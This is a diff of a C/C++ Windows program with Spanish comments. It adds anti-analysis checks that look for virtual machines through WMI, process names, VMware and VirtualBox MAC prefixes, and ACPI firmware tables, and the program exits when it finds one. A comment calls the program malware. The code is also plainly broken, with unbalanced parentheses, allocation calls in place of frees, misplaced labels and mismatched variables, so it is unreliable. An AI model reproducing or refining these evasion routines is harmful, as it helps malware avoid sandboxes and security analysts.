@@ -1,5 +1,5 @@
 /*
-
+HeapFree y CloseHandle
 SYSCALLS:
 - ver si plicar Syscalls en las funciones CreateToolHelp32Snapshot, etcétera.
 
@@ -44,8 +44,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine,
 	
     if(osver.dwMajorVersion < 6){
     	Exit(1);
-    	}
-    }
+	}
 	
 	
 	
@@ -57,10 +56,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine,
 static BOOL CHECK_VM(){
 	
 	int gb_size = 257;
+	BOOL ProcError = FALSE;
 	HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED); //Inicialización de la biblioteca COM para ser usada por el subproceso que haga la llamada. La simultaneidad Multi-threading (también llamado free-threading) permite que las llamadas a métodos de objetos creados por este hilo se ejecuten en cualquier hilo. No hay serialización de llamadas, es decir, pueden ocurrir muchas llamadas al mismo método
     //Hay que configurar las llamadas a la WMI
 	
-	if(FAILED(hres)) goto check_vmprocess;
+	if(FAILED(hres)){ProcError = FALSE;goto check_vmprocess;}
 	
 	//Inicialización para la seguridad del proceso COM. 
 	hres =  CoInitializeSecurity(
@@ -75,7 +75,7 @@ static BOOL CHECK_VM(){
     NULL //Siempre es NULL                   
     );
 	
-	if(FAILED(hres)){ CoUninitialize(); goto check_vmprocess;}
+	if(FAILED(hres)){ ProcError = TRUE;CoUninitialize(); goto check_vmprocess;}
 	
 	IWbemLocator *loc = NULL; //Objeto COM en proceso. Interfaz para obtener el puntero a la interfaz para acceder a WMI
 	
@@ -85,7 +85,7 @@ static BOOL CHECK_VM(){
     CLSCTX_INPROC_SERVER, //Contexto donde operará este objeto. Se ejecutará en el mismo proceso que el que llamó la función creadora del contexto
     IID_IWbemLocator, (LPVOID *) &loc); //Interfaz puntero de la interfaz que nos brindará acceso a la WMI
     
-    if(FAILED(hres)){ CoUninitialize(); goto check_vmprocess;}
+    if(FAILED(hres)){ ProcError = TRUE;CoUninitialize(); goto check_vmprocess;}
     
     IWbemServices *svc = NULL; //Interfaz que nos permitirá acceder a la WMI
     
@@ -107,7 +107,7 @@ static BOOL CHECK_VM(){
      PGLOB->CON_REALIZED = TRUE;
      
      
-     if(FAILED(hres)){ loc->Release();CoUninitialize(); goto check_vmprocess;}
+     if(FAILED(hres)){ProcError = TRUE; loc->Release();CoUninitialize(); goto check_vmprocess;}
      
      hres = CoSetProxyBlanket(//Inicialización de la seguridad del proxy creado para que WMI tome el papel del cliente en la consulta al namespace
      svc,  //Proxy que se establecerá                  
@@ -120,7 +120,7 @@ static BOOL CHECK_VM(){
      EOAC_NONE //Ninguna capacidad extra para este proxy              
     );
     
-    if(FAILED(hres)){ loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
+    if(FAILED(hres)){ ProcError = TRUE;loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
     
     IEnumWbemClassObject* _enum = NULL; //Interfaz para enumerar los componentes WMI
     hres = svc->ExecQuery(//Ejecutar nuestra solicitud
@@ -130,7 +130,7 @@ static BOOL CHECK_VM(){
     NULL, 
      _enum); //Donde almacenaremos la consulta
     
-    if(FAILED(hres)){_enum->Release(); loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
+    if(FAILED(hres)){ProcError = TRUE;_enum->Release(); loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
     
     IWbemClassObject *obj = NULL;
     
@@ -159,31 +159,59 @@ static BOOL CHECK_VM(){
         
         //Trataremos de obtener el PID de los procesos de las máquinas virtuales, si nos devuelve uno, significa que está presente uno de los procesos
         
-    	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        DWORD pid = 0;
-        PROCESSENTRY32 pe;
-        if(snap == INVALID_HANDLE_VALUE) return TRUE;
-        pe.dwSize = sizeof(pe);
-        BOOL ps = Process32First(snap, &pe);
-        while(ps){
-        	for(int i = 0; i < sizeof pname/sizeof pname[0]; i++){
-        	    if(strcmp((char*)pe.szExeFile,pname[i]) == 0){
-         	        pid = pe.th32ProcessID;
-         	    }
-                 else{
-                     ps = Process32Next(snap, &pe);
-                    }
-        	    }
-            CloseHandle(snap);
-            }
+        DWORD pid = 0, pids [1024], rvsize, ned;
+         
+         BOOL handle = FALSE;
+         HMODULE hm;
+         
+         char *buffer = (char*)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 1024);
+         if(CHECK_ALLOC_ERROR(0,0,TRUE,buffer)){
+         	ProcError = TRUE;
+             HeapFree(GetCurrentHeap(), 0, buffer);
+             goto vm_checks;
+         	}
+         handle = EnumProcesses(pids, sizeof(pids), &rvsize);
+         if(!handle){
+         	ProcError = TRUE;
+             HeapFree(GetCurrentHeap(), 0, buffer);
+             goto vm_checks;
+         }
+         int proc = rvsize / sizeof(DWORD);
+         
+         for(int i = 0; i < proc;i++){
+         	HANDLE hproc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pids[i]);
+             
+             if(hproc != NULL){
+             	EnumProcessModules(hproc, &hm, sizeof(hm), &ned);
+                 GetModuleBaseName(hproc, hm, buffer, sizeof(buffer) / sizeof(char*));
+                 CloseHandle(hproc);
+                 
+                 if(strcmp(buffer, pname == 0){
+                 	HeapFree(GetCurrentHeap(), 0, buffer);
+                 	pid = pids[i];
+                 	}
+             	}
+             else{
+                 HeapFree(GetCurrentHeap(),0,buffer);
+                 ProcError = TRUE;
+                 CloseHandle(hproc);
+                 goto vm_checks;
+                 }
+         	}
+       HeapFree(GetCurrentHeap(),0,buffer);
+       CloseHandle(hproc);  
+        vm_checks:
         if(pid != 0) return TRUE;
         else{
         	BOOL SOME_BOOLEAN = CHECK_SPEC_VM_INFO();
-            if(SOME_BOOLEAN) return TRUE;
+            if(SOME_BOOLEAN){
+                return TRUE;
+                }
         	}
         }
     //Si algo de esto no llega a ser suficiente, tendríamos que analizar en memoria para encontrar los procesos
-    return FALSE;
+    if(!ProcError) return FALSE;
+    Exit(1);
 	}
 	
 	
@@ -252,6 +280,8 @@ MÁS INFORMACIÓN : https://docs.microsoft.com/en-us/openspecs/windows_protocols
 Las aplicaciones cliente y los scripts que acceden a proveedores estándar de WMI de 32 bits siguen funcionando con normalidad cuando se ejecutan en un sistema operativo de 64 bits. 
 Solo dos proveedores preinstalados, el proveedor del Registro del sistema y el proveedor de vistas ,tienen versiones de 64 bits que se ejecutan en paralelo con las versiones de 32 bits. 
 Sin embargo, una aplicación de 32 bits que solicita instancias de Windows Driver Model (WDM) de 32 bits recibe las instancias predeterminadas de la clase WDM de 64 bits en un sistema operativo de 64 bits.
+
+el repositorio WMI es un contenedor de datos multipropósito que no se puede DETECTAR ni quitar.
 */
 
 
@@ -266,6 +296,7 @@ static DWORD WINAPI WAIT_SVTIME(LPVOID lpstart){
 	}
 static BOOL CHECK_SPEC_VM_INFO(){
 	
+	int FUNC_EXCEPTION = 0;
 	//OBTENER LAS MAC DE LA VM, SI NO FUERON CAMBIADAS, FUNCIONARÁ
     BOOL ANY_EXEC_CHECK = FALSE;
 
@@ -273,13 +304,13 @@ static BOOL CHECK_SPEC_VM_INFO(){
     ULONG BUFF = sizeof(IP_ADAPTER_INFO); //Buffer por si hay una excepción
              
      char *MAC = (char *)HeapAlloc(GetProcessHeap(),HEAP_GENERATE_EXCEPTIONS,24); //Reservamos memoria para almacenar la MAC
-     CHECK_ALLOC_ERROR(1,0, MAC);
+     if(CHECK_ALLOC_ERROR(0,0,TRUE, MAC)){FUNC_EXCEPTION++; HeapFree(GetProcessHeap(), 0, MAC); goto next_vmware_check1;}
      adapter = (IP_ADAPTER_INFO *)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(IP_ADAPTER_INFO));
-     CHECK_ALLOC_ERROR(2,1,adapter);
+     if(CHECK_ALLOC_ERROR(1,1,TRUE, adapter)) {FUNC_EXCEPTION++;HeapFree(GetProcessHeap(), 0, MAC);HeapFree(GetProcessHeap(), 0, adapter);goto next_vmware_check1;}
      if(GetAdaptersAdresses(AF_UNSPEC, GAA_FLAG_INCLUDE_ALL_COMPARTMENTS, NULL, adapter, &BUFF) == ERROR_BUFFER_OVERFLOW){ //Si el buffer inicial no es suficiente
      	HeapFree(GetProcessHeap(),0, adapter);
          adapter = (IP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, BUFF);
-         CHECK_ALLOC_ERROR(2,1,adapter);
+         if(CHECK_ALLOC_ERROR(1,1,TRUE, adapter)) {FUNC_EXCEPTION++;HeapFree(GetProcessHeap(), 0, MAC);HeapFree(GetProcessHeap(), 0, adapter);goto next_vmware_check1;}
          //Cambiamos el tamaño del buffer al tamaño necesario
      	}
      if(GetAdaptersAdresses(AF_UNSPEC, GAA_FLAG_INCLUDE_ALL_COMPARTMENTS, NULL, adapter, &BUFF) == NO_ERROR){ //Si ya no hay errores
@@ -294,6 +325,7 @@ static BOOL CHECK_SPEC_VM_INFO(){
      	}
      else{
      	HeapFree(GetProcessHeap(), 0, adapter);
+         FUNC_EXCEPTION++;
          goto next_vmware_check1;
      }
      const char* mac_blacklist{"00:05:69", "00:0c:29" , "00:1C:14" , "00:50:56", "08:00:27"}; //ENCRIPTAR DIRECCIONES MAC
@@ -302,9 +334,76 @@ static BOOL CHECK_SPEC_VM_INFO(){
      	}
     HeapFree(GetProcessHeap(),0,MAC);
     next_vmware_check1:
+    //Verificaremos el Firmware ACPI, que controla la BIOS y gestiona la energía del dispositivo. Sus tablas contienen información sobre el
+    //sistema base y el hardware (Aquí podríamos identificar VMWARE)
     
+    PDWORD tables = (PDWORD)HeapAlloc (GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
+    if(CHECK_ALLOC_ERROR(3,3,TRUE, tables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(), 0, tables);goto next_vmware_check2;}
+    
+    SecureZeroMemory(tables, 4096); //Limpiamos el bloque de memoria
+    
+    DWORD tab_size = EnumSystemFirmwareTables(('ACPI'), tables, 4096); //Accedemos a las tablas de ACPI
+    if(tab_size < 4) return TRUE; //Las máquinas virtuales no superan las 4 tablas del firmware
+    else{
+    	for(DWORD i = 0; i < tab_size/4; i++){ //Recorremos las tablas
+    	    DWORD newsize = (tab_size*0);
+            PBYTE newtables = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
+           if(CHECK_ALLOC_ERROR(4,4,TRUE, newtables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(),0,tables); HeapAlloc(GetCurrentHeap(), 0, newtable);goto next_vmware_check2;}
+            SecureZeroMemory(newtables, 4096)
+            
+            DWORD exp_bytes = GetSystemFirmwareTable(('ACPI'), tables[i], &newsize, 4096); //Obtenemos las tablas
+            
+             
+            if(exp_bytes == 0){ //Si ocurre un error en la escritura en el buffer
+            	HeapFree(GetCurrentHeap(),0,newtables);
+                HeapFree(GetCurrentHeap(), 0, tables);
+                FUNC_EXCEPTION++;
+                goto next_vmware_check2;
+            }
+            if(exp_bytes > 4096){ //Si se produce buffer overflow
+            	
+            	HeapFree(GetCurrentHeap(),0,newtables);  
+                newtables = HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, exp_bytes);
+                if(CHECK_ALLOC_ERROR(4,4,TRUE, newtables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(),0,tables); HeapAlloc(GetCurrentHeap(), 0, newtable);goto next_vmware_check2;}
+                SecureZeroMemory(newtables, exp_bytes);
+                DWORD n_eb = exp_bytes;
+                n_eb = GetSystemFirmwareTable(('ACPI'), tables[i], &newsize, exp_bytes);
+                //Reestablecemos nuestro buffer receptor con los bytes adecuados
+                if(n_eb == 0){ //Si se produce un error en la escritura en el buffer
+                	HeapFree(GetCurrentHeap(), 0, newtables);
+                    HeapFree(GetCurrentHeap(), 0, tables);
+                    FUNC_EXCEPTION++;
+                    goto next_vmware_check2;
+                } 
+                PBYTE check_vm = newtables;
+                
+                if(check_vm){
+                	PBYTE vmw_name = (PBYTE)"VMWARE"; //Tabla de VMWARE en el firmware ACPI
+                    for(size_t vmwi = 0; vmwi < newsize - 6; vmwi++){
+                    	if(memcmp(&tables[vmwi], vmw_name, 6) == 0){ //Buscamos la tabla en el buffer establecido
+                    	    HeapFree(GetCurrentHeap(), 0, newtables);
+                            HeapFree(GetCurrentHeap(), 0, tables);
+                            return TRUE;
+                    	}
+                    }
+                }
+            } 
+    	}
+	}
+	next_vmware_check2:
+	
+	DWORD firmware = (DWORD)('RSMB'), bios_sz = 0;
+	
+	PBYTE bios (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
+	if(CHECK_ALLOC_ERROR(4,4,TRUE, bios)) {FUNC_EXCEPTION++;HeapFree(GetCurrentHeap(), 0, bios);goto next_vmware_check3;}
+	
+	
+	if(FUNC_EXCEPTION != 0) Exit(1); //Explicación: Esta variable registra los fallos cometidos en las funciones, y salta al siguiente módulo para hacer que el malware sea lo más estable
+                                                               //posible. Pero claro, si luego resulta que han dado negativo las pruebas, y nos hemos saltado módulos, pues no podremos asegurarnos de que haya VM o no, por lo que provocará una excepción
+	next_vmware_check3:
+    else return FALSE;
 }
-void CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, ...){
+BOOL CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, BOOL RETURN, ...){
 	//Controlamos los errores de memoria
 	LinkedList<void *> lista;
 	va_list vl;
@@ -321,6 +420,12 @@ void CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, ...){
 		case 2: ;
 		    lista.add((void *)va_arg(vl, HANDLE));
 		    break;
+		case 3: ;
+		    lista.add((void *)va_arg(vl, PDWORD);
+		    break;
+		case 4: ;
+		    lista.add((void *)va_arg(vl, PBYTE);
+		    break;
 		    }
 		
 		}
@@ -329,17 +434,33 @@ void CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, ...){
 		case 0: ;
 	        if((char *)lista[DATA_TYPE_ID] == NULL){
 		        HeapFree(GetProcessHeap(), 0, (char *)lista[DATA_TYPE_ID]);
-		        Exit(1);
+		        if(!RETURN)Exit(1);
+		        else return TRUE;
 			}
 		case 1: ;
 		    if((IP_ADAPTER_INFO * )lista[DATA_TYPE_ID] == NULL){
 			    HeapFree(GetProcessHeap(),0,(IP_ADAPTER_INFO *)lista[DATA_TYPE_ID]);
-			    Exit(1);
+			    if(!RETURN)Exit(1);
+		        else return TRUE;
 		case 2: ;
 			if((HANDLE)lista[DATA_TYPE_ID] == INVALID_HANDLE_VALUE){
 				CloseHandle((HANDLE)lista[DATA_TYPE_ID]);
-				Exit(1);
+				if(!RETURN)Exit(1);
+		        else return TRUE;
 				}
+		case 3: ;
+		    if((PDWORD)lista[DATA_TYPE_ID] == NULL){
+			    HeapFree(GetProcessHeap(),0,(PDWORD)lista[DATA_TYPE_ID]);
+			    if(!RETURN)Exit(1);
+		        else return TRUE;
+			    }
+		case 4: ;
+		    if(PBYTE)lista[DATA_TYPE_ID] == NULL){
+			    HeapFree(GetProcessHeap(), 0, (PBYTE)lista[DATA_TYPE_ID]);
+			    if(!RETURN)Exit(1);
+		        else return TRUE;
+			    }
 			}
 		}
+	return FALSE;
 	}
